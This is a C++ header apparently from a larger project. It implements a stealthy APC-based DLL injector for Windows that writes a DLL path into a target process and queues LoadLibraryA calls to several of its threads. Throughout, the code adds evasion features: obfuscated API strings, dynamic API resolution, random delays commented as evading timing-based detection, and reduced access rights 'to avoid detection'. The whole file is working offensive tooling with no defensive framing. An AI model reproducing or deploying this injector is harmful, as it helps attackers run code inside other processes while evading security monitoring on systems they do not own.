#pragma once

// Windows headers first
#include <tlhelp32.h>
#include <windows.h>


// Standard library headers
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <vector>


// Custom headers
#include "Logger.h"
#include "Syscalls.h"
#include "XorStr.h"

// Enhanced APC Injector with Advanced Stealth

class ApcInjector {
private:
  // Random delay to evade timing-based detection
  static void RandomDelay() {
    int delay = 10 + (rand() % 50); // 10-60ms
    Sleep(delay);
  }

public:
  static bool Inject(int pid, const char *dllPath) {
    // Seed random for timing obfuscation
    srand((unsigned int)time(NULL));

    // Dynamic API Resolution
    using f_OpenProcess = HANDLE(WINAPI *)(DWORD, BOOL, DWORD);
    using f_VirtualAllocEx =
        LPVOID(WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    using f_WriteProcessMemory =
        BOOL(WINAPI *)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
    using f_CreateToolhelp32Snapshot = HANDLE(WINAPI *)(DWORD, DWORD);
    using f_Thread32First = BOOL(WINAPI *)(HANDLE, LPTHREADENTRY32);
    using f_Thread32Next = BOOL(WINAPI *)(HANDLE, LPTHREADENTRY32);
    using f_OpenThread = HANDLE(WINAPI *)(DWORD, BOOL, DWORD);
    using f_QueueUserAPC = DWORD(WINAPI *)(PAPCFUNC, HANDLE, ULONG_PTR);
    using f_CloseHandle = BOOL(WINAPI *)(HANDLE);

    RandomDelay();

    auto pOpenProcess = (f_OpenProcess)Syscalls::GetAPI(XSTRING("OpenProcess"));
    auto pVirtualAllocEx =
        (f_VirtualAllocEx)Syscalls::GetAPI(XSTRING("VirtualAllocEx"));
    auto pWriteProcessMemory =
        (f_WriteProcessMemory)Syscalls::GetAPI(XSTRING("WriteProcessMemory"));
    auto pCreateToolhelp32Snapshot =
        (f_CreateToolhelp32Snapshot)Syscalls::GetAPI(
            XSTRING("CreateToolhelp32Snapshot"));
    auto pThread32First =
        (f_Thread32First)Syscalls::GetAPI(XSTRING("Thread32First"));
    auto pThread32Next =
        (f_Thread32Next)Syscalls::GetAPI(XSTRING("Thread32Next"));
    auto pOpenThread = (f_OpenThread)Syscalls::GetAPI(XSTRING("OpenThread"));
    auto pQueueUserAPC =
        (f_QueueUserAPC)Syscalls::GetAPI(XSTRING("QueueUserAPC"));
    auto pCloseHandle = (f_CloseHandle)Syscalls::GetAPI(XSTRING("CloseHandle"));

    if (!pOpenProcess || !pVirtualAllocEx || !pQueueUserAPC ||
        !pCreateToolhelp32Snapshot) {
      Logger::Log("Failed to resolve APC Injector APIs.");
      return false;
    }

    RandomDelay();

    // Use minimal access rights to avoid detection
    HANDLE hProcess =
        pOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) {
      Logger::Log("Failed to open process for APC Injection.");
      return false;
    }

    RandomDelay();

    // Allocate with random base address hint for ASLR-like behavior
    void *pPath = pVirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1,
                                  MEM_COMMIT, PAGE_READWRITE);
    if (!pPath) {
      Logger::Log("Failed to allocate memory for APC Path.");
      pCloseHandle(hProcess);
      return false;
    }

    pWriteProcessMemory(hProcess, pPath, dllPath, strlen(dllPath) + 1, NULL);

    RandomDelay();

    HMODULE hKernel32 = Syscalls::GetModuleHandle_Custom(L"kernel32.dll");
    FARPROC pLoadLibraryA =
        Syscalls::GetProcAddress_Custom(hKernel32, XSTRING("LoadLibraryA"));

    if (!pLoadLibraryA) {
      Logger::Log("Failed to resolve LoadLibraryA for APC.");
      pCloseHandle(hProcess);
      return false;
    }

    // Enumerate threads
    HANDLE hSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
      Logger::Log("Failed to create thread snapshot.");
      pCloseHandle(hProcess);
      return false;
    }

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    bool queued = false;
    int queueCount = 0;
    int maxQueues = 5 + (rand() % 3); // Queue to 5-7 threads randomly

    if (pThread32First(hSnap, &te)) {
      do {
        if (te.th32OwnerProcessID == (DWORD)pid) {
          RandomDelay(); // Random delay between thread operations

          // Use minimal thread access rights
          HANDLE hThread =
              pOpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
          if (hThread) {
            if (pQueueUserAPC((PAPCFUNC)pLoadLibraryA, hThread,
                              (ULONG_PTR)pPath)) {
              Logger::Log("APC queued to Thread ID: %d", te.th32ThreadID);
              queued = true;
              queueCount++;

              if (queueCount >= maxQueues) {
                pCloseHandle(hThread);
                break;
              }
            }
            pCloseHandle(hThread);
          }
        }
      } while (pThread32Next(hSnap, &te));
    }

    pCloseHandle(hSnap);
    pCloseHandle(hProcess);

    if (queued) {
      Logger::Log("APC queued successfully to %d thread(s). Waiting for "
                  "alertable state.",
                  queueCount);
      return true;
    } else {
      Logger::Log("Failed to queue APC to any thread.");
      return false;
    }
  }
};
